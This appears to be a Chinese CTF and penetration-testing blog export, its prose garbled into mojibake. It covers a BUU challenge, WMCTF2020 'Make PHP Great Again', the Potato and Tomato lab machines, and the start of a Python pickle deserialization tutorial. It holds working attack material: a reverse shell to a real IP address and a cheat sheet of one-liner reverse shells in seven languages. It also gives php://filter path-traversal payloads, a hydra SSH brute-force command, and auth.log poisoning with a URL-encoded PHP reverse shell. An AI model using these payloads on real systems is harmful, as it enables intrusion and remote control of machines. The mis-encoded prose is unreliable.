<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦å»æ‹¿åˆ°keyï¼Œç›´æ¥è¯»å–/tmp/secret.txtä¼šè¯»å–ä¸åˆ°ï¼Œå› ä¸ºå·²ç»è¢«åˆ æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥å»å°è¯•è¯»å–/proc/self/fd/3ï¼Œç»“æœè¿˜æ˜¯å‡ºä¸æ¥ï¼Œè¿™ä¸‹å°±åªèƒ½çˆ†ç ´äº†ã€‚ã€‚ã€‚çœ‹çœ‹å›æ˜¾é•¿åº¦æ˜æ˜¾ä¸å¯¹çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://ab2b25bc-4b91-4cdd-8783-c166e7d6ebae.node3.buuoj.cn/page?url=../../../../../../proc/&#123;&#125;/fd/3&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url=url).text</span><br><span class="line">    print(<span class="built_in">len</span>(res),<span class="string">&quot;æ­¤æ—¶iä¸º&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘å¾—è¿›ç¨‹æ˜¯14ï¼Œçˆ†ç ´å¾—åˆ°</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">yoKTwnWJilxVJnoa8y9HwwAAagZ7aKs0MGPKhMbjYWA=</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶åªèƒ½æ‰§è¡Œos.system,ç›´æ¥åå¼¹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¼¹è¿‡å»å°±æ‹¿åˆ°shelläº†</p>
<p><img src="image-20201216163429545.png" alt="image-20201216163429545"></p>
<p>è¿™é‡Œé¡ºä¾¿æŠŠå„ç§è¯­è¨€ä¸€å¥è¯åå¼¹shellè®°å½•åœ¨æ­¤ï¼š</p>
<p>python:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>perl:</p>
<p>1</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>2</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Ruby</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Lua</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;5555&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>AWK</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>ç»•è¿‡require_once åªèƒ½åŒ…å«ä¸€æ¬¡çš„çš„é™åˆ¶</p>
<p>ä»Šå¤©å°±æ¥è°ˆè°ˆï¼Œæ€ä¹ˆè®¾æƒ³å¦‚ä½•ç»•è¿‡è¿™ä¸ªå“ˆå¸Œè¡¨ï¼Œè®©phpè®¤ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œåˆå¯ä»¥è®©phpèƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯»å–åˆ°å†…å®¹ã€‚</p>
<p>åœ¨è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œ<code>/proc/self</code>æŒ‡å‘å½“å‰è¿›ç¨‹çš„<code>/proc/pid/</code>ï¼Œ<code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ï¼Œpayload:</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br><span class="line">&#x2F;&#x2F;result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo&#x3D;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†å¯¹ç»•è¿‡çš„åŸç†è¿›è¡Œåˆ†æï¼Œphp7.2.23çš„æºç è¿›è¡Œåˆ†æï¼Œå»ºè®®é…åˆClionåœ¨linuxé‡Œè¿›è¡Œè°ƒè¯•ï¼Œè‡³äºå¦‚ä½•æ­å»ºè°ƒè¯•ç¯å¢ƒï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ï¼Œå‚è€ƒä¸€äº›åˆ«çš„æ–‡ç« ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5ODA0NDE2MA&#x3D;&#x3D;&amp;mid&#x3D;2649729209&amp;idx&#x3D;1&amp;sn&#x3D;78c1f6cf291e5cfca3088f02216ccffd&amp;chksm&#x3D;888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime&#x3D;1597388716474&amp;sharer_shareid&#x3D;33a823b10ae99f33a60db621d83241cb#rd</span><br></pre></td></tr></table></figure>



<p>å¦å¤–ä¸€ç§æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;571be1a2-1a80-477d-8f8c-71cd3a4d93a3.node3.buuoj.cn&#x2F;</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;123&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Potatoå’ŒTomatoæ¸—é€</title>
    <url>/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="Potatoæ¸—é€"><a href="#Potatoæ¸—é€" class="headerlink" title="Potatoæ¸—é€"></a>Potatoæ¸—é€</h1><p>ä¹Ÿæ˜¯ç»å…¸çš„dirbå’Œnmapæ‰«ä¸€æ³¢</p>
<p>nmapçš„ç»“æœ</p>
<p><img src="image-20201108210135725.png" alt="image-20201108210135725"></p>
<p>dirbçš„ç»“æœ</p>
<p><img src="image-20201108210207483.png" alt="image-20201108210207483"></p>
<p>ä¹Ÿå°±å‘ç°äº†ä¸€ä¸ªinfo.phpèƒ½ç”¨ï¼Œè®¿é—®ä¸€äº›æ˜¯phpinfoï¼Œå‘ƒï¼Œé‚£å†çœ‹çœ‹nmapï¼Œå¼€äº†7120ç«¯å£ï¼Œçœ‹çœ‹ï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œåªèƒ½é€šè¿‡hypdraè¿›è¡Œçˆ†ç ´å’¯ï¼Œå‘ƒï¼Œè´¦å·å¯†ç éƒ½ä¸çŸ¥é“ï¼Œåªèƒ½è¯•è¯•çœ‹äº†</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">hydra  192.168.1.113 ssh -s 7120  -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f</span><br></pre></td></tr></table></figure>



<p>ç™»é™†ä¸Šä¹‹åæŸ¥çœ‹uname -a æŸ¥çœ‹èƒ½ä¸èƒ½ææƒ</p>
<p>çœ‹è§å†…æ ¸ä¸ºubuntu3.å¤šï¼Œè¿™ç§è€ç‰ˆæœ¬ä¸€èˆ¬å¯ä»¥ç›´æ¥æï¼Œå°è¯•æœç´¢</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potato@ubuntu:/tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>searchsploit Ubuntu 3.13.0</p>
<p><img src="image-20201109103119279.png" alt="image-20201109103119279"></p>
<p>åˆ©ç”¨-pæŒ‡ä»¤æ‰¾åˆ°å­˜æ”¾ä½ç½®ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿ä¸‹expäº†ï¼Œå†ä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•ä¸‹ï¼ˆå› ä¸ºtmpç›®å½•å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯777æƒé™</p>
<p><img src="image-20201109103447331.png" alt="image-20201109103447331"></p>
<p>æˆåŠŸæ‹¿ä¸‹ï¼</p>
<h1 id="Tomatoæ¸—é€"><a href="#Tomatoæ¸—é€" class="headerlink" title="Tomatoæ¸—é€"></a>Tomatoæ¸—é€</h1><p>é¦–å…ˆç»å…¸dribå’Œnmapæ‰«ä¸€æ³¢</p>
<p><img src="image-20201109103819079.png" alt="image-20201109103819079"></p>
<p>nmapï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p 0-65535</span><br></pre></td></tr></table></figure>

<p><img src="Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/image-20201109104128465.png" alt="image-20201109104128465"></p>
<p>å‘ç°8888ç«¯å£å’Œ21ï¼Œå¼€äº†å…¶ä»–tcpå’Œsshçš„ç«¯å£,ä½†æ˜¯éƒ½æ²¡æ³•ç”¨ï¼Œåœ¨info.phpä¸‹å‘ç°æ–‡ä»¶åŒ…å«</p>
<p><img src="image-20201109110118801.png" alt="image-20201109110118801"></p>
<p>å°è¯•åŒ…å«äº†ä¸€ä¸‹etc/passwdå°±å¡ä½äº†ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆåšã€‚ã€‚</p>
<hr>
<p>è¿™é‡Œè®°å½•ä¸‹å„ä¸ªlogçš„æ–‡ä»¶</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">9)/var/run/utmp è®°å½•ç€ç°åœ¨ç™»å½•çš„ç”¨æˆ·;</span><br><span class="line">10)/var/log/lastlog è®°å½•æ¯ä¸ªç”¨æˆ·æœ€åçš„ç™»å½•ä¿¡æ¯;</span><br><span class="line">11)/var/log/btmp è®°å½•é”™è¯¯çš„ç™»å½•å°è¯•;</span><br><span class="line">12)/var/log/dmesgå†…æ ¸æ—¥å¿—;</span><br><span class="line">13)/var/log/cpus CPUçš„å¤„ç†ä¿¡æ¯ï¼›</span><br><span class="line">14)/var/log/syslog äº‹ä»¶è®°å½•ç›‘æ§ç¨‹åºæ—¥å¿—ï¼›</span><br><span class="line">15)/var/log/auth.log ç”¨æˆ·è®¤è¯æ—¥å¿—ï¼›</span><br><span class="line">16)/var/log/daemon.log ç³»ç»Ÿè¿›ç¨‹æ—¥å¿—ï¼›</span><br><span class="line">17)/var/log/mail.err é‚®ä»¶é”™è¯¯ä¿¡æ¯ï¼›</span><br><span class="line"></span><br><span class="line">18)/var/log/mail.info é‚®ä»¶ä¿¡æ¯ï¼›</span><br><span class="line"></span><br><span class="line">19)/var/log/mail.warn é‚®ä»¶è­¦å‘Šä¿¡æ¯ï¼›</span><br><span class="line">20)/var/log/daemon.log ç³»ç»Ÿç›‘æ§ç¨‹åºäº§ç”Ÿçš„ä¿¡æ¯;</span><br><span class="line">21)/var/log/kern å†…æ ¸äº§ç”Ÿçš„ä¿¡æ¯;</span><br><span class="line">22)/var/log/lpr   è¡Œæ‰“å°æœºå‡è„±æœºç³»ç»Ÿäº§ç”Ÿçš„ä¿¡æ¯;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¤§ä½¬çš„payloadï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„logæ–‡ä»¶åªæœ‰auth.log,å› ä¸ºåªæœ‰ä¸ªè¿™ä¸ªæ—¥å¿—æˆ‘ä»¬å¯ä»¥æ“ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬å†™å…¥ä¸€å¥è¯ï¼Œå†è¿›è¡ŒåŒ…å«çš„è¯ï¼Œä¸å°±æ˜¯æ‰§è¡Œäº†å‘½ä»¤äº†å—ï¼ˆ<strong>è¿™ä¸ªæ€è·¯çœŸçš„éªš</strong></p>
<p>æ‰€ä»¥æˆ‘ä»¬é©¬ä¸Šæ“ä½œä¸€æ³¢ï¼Œè¿™é‡Œæˆ‘ç”¨xshellè„¸ä¸ŠÂ·çš„</p>
<p><img src="image-20201109113724842.png" alt="image-20201109113724842"></p>
<p>é©¬ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls</span><br></pre></td></tr></table></figure>

<p><img src="image-20201109113800161.png" alt="image-20201109113800161"></p>
<p>å†ä¹‹åä¸ºäº†èƒ½å¤Ÿä¼ è„šæœ¬å•¥çš„å•Šï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€æ³¢åå¼¹shellï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>urlencodeä¸€ä¸‹</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span><br></pre></td></tr></table></figure>

<p>å¼¹åˆ°è‡ªå·±æœ¬æœºä¸Šå³å¯ã€‚</p>
<p><img src="image-20201109113953687.png" alt="image-20201109113953687"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ±‚ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œå‘ç°python3å¯ä»¥ç”¨ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç”¨Pythonæ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„shell</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åuname -a çœ‹å†…æ ¸ï¼Œexpä¸€å†²å°±å®Œäº‹äº†</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null   æˆ‘ä»–å¦ˆç›´æ¥ä¸€æŠŠæ¢­</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonååºåˆ—åŒ–</title>
    <url>/2020/12/07/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>ä»Šå¤©åœ¨åˆ·BUUçš„æ—¶å€™åšåˆ°äº†IKUNè¿™é“é¢˜ç›®ï¼Œä»¥å‰æ²¡æœ‰æ¥è§¦è¿‡Pythonçš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥ä¸ä¼šåšåˆ°æœ€åä¸€æ­¥..å¤ç°å®Œä¹‹åå†³å®šæ€»ç»“ä¸€ä¸‹Pythonçš„ååºåˆ—åŒ–çš„å‡ ç§æ–¹å¼ï¼š</p>
<p>Pythonèƒ½å¤Ÿå®ç°çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹å¼ä¸»è¦æœ‰ä¸‰ï¼š</p>
<ul>
<li>JSON</li>
<li>pickle</li>
<li>shelve</li>
</ul>
<p>è€Œè¿™Ikunè¿™é“é¢˜ä½¿ç”¨çš„ä¾¿æ˜¯Pickleï¼Œæ•…æˆ‘ä»¬ä»è¿™ä¸€éƒ¨åˆ†å¼€å§‹è¯´èµ·ã€‚</p>
<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p>pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚</p>
<p>pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ</p>
<p>pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚</p>
<p>Pythonæ¥å£æœ‰4ä¸ªï¼š</p>
<ul>
<li>dump</li>
<li>dumps</li>
<li>load</li>
<li>loads</li>
</ul>
<h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>dumpæˆ‘ä»¬ç”¨äºå°†æ•°æ®å†™å…¥æ–‡ä»¶å½“ä¸­ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dumpï¼ˆobjï¼Œfileï¼Œprotocol = <span class="literal">None</span>ï¼Œ*ï¼Œfix_imports = <span class="literal">True</span> ï¼‰</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å®è·µä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, a</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.name + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa = Person(<span class="string">&quot;JGood&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;p.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.dump(aa,f,<span class="number">0</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">å¾—åˆ°æ•°æ®å¦‚ä¸‹ï¼š</span><br><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">Person</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">Vname</span><br><span class="line">p6</span><br><span class="line">VJGood</span><br><span class="line">p7</span><br><span class="line">sVage</span><br><span class="line">p8</span><br><span class="line">I2</span><br><span class="line">sb.</span><br><span class="line"><span class="comment"># è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¼šæœ‰å¤§é‡çš„\næ¢è¡Œç¬¦</span></span><br></pre></td></tr></table></figure>

<h2 id="dumps"><a href="#dumps" class="headerlink" title="dumps"></a>dumps</h2><p>è¯¥å‡½æ•°ä¸dumpçš„å·®åˆ«åœ¨äºè¯¥å‡½æ•°ä¸ä¼šå°†å¯¹è±¡å†™å…¥æ–‡ä»¶å½“ä¸­ï¼Œåªä¼šå°†å…¶è½¬åŒ–ä¸ºbyteså¯¹è±¡ï¼Œä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, a</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.name + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa = Person(<span class="string">&quot;JGood&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)</span></span><br><span class="line">c = pickle.dumps(aa,<span class="number">0</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nPerson\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVJGood\np7\nsVage\np8\nI2\nsb.&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>loadä¸dumpå¯¹åº”ï¼Œè¯»å–æŸä¸ªæ–‡ä»¶å¹¶å°†å…¶è¿˜åŸä¸ºä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pickle.loadï¼ˆfileï¼Œ*ï¼Œfix_imports &#x3D; Trueï¼Œencoding &#x3D;â€œASCIIâ€ï¼Œerrors &#x3D;â€œstrictâ€ ï¼‰</span><br><span class="line">ä»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡ æ–‡ä»¶ä¸­è¯»å–pickleå¯¹è±¡è¡¨ç¤ºï¼Œå¹¶è¿”å›å…¶ä¸­æŒ‡å®šçš„é‡æ„å¯¹è±¡å±‚æ¬¡ç»“æ„ã€‚è¿™ç›¸å½“äºUnpickler(file).load()ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="loads"><a href="#loads" class="headerlink" title="loads"></a>loads</h2><p>loadsä¸dumpså¯¹åº”ï¼Œå°†ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡æ¢æˆä¸€ä¸ªç±»ã€‚ </p>
<p>åœ¨å¤§éƒ¨åˆ†çš„æ¯”èµ›å½“ä¸­ï¼Œæˆ‘ä»¬é‡è§çš„æƒ…å†µéƒ½æ˜¯é¢˜ç›®ä¼šloadå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾çš„å°±æ˜¯é­”æ³•å‡½æ•°ã€‚ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨ <code>__reduce__()</code>é­”æ³•å‡½æ•°ä¸Šï¼Œè¿™ä¸€ç‚¹å’ŒPHPä¸­çš„<code>__wakeup()</code> é­”æœ¯æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å› ä¸ºæ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ç±»å‡½æ•°ã€‚è€Œè¿™æ°å¥½æ˜¯ååºåˆ—åŒ–æ¼æ´ç»å¸¸å‡ºç°çš„åœ°æ–¹ã€‚</p>
